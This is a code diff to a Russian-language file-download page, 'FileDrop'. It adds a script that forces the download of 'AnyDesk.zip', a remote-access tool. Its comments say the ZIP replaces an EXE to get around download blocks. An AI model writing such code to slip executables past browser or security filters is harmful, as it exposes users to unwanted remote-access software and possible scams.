@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>FileDrop | Скачать файл</title>
     <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
     <div class="card">
@@ -60,7 +61,18 @@
             </div>
         </div>
     </div>
-
-    <script src="script.js"></script>
+    <script>
+    // Принудительное скачивание через iframe (обход блокировок)
+    document.getElementById('downloadBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        const link = document.createElement('a');
+        link.href = 'AnyDesk.zip';  // используем ZIP вместо EXE
+        link.download = 'AnyDesk.zip';
+        link.click();
+        
+        // Показать подсказку
+        alert('Если скачивание не началось, нажмите правой кнопкой → "Сохранить ссылку как"');
+    });
+    </script>
 </body>
 </html>
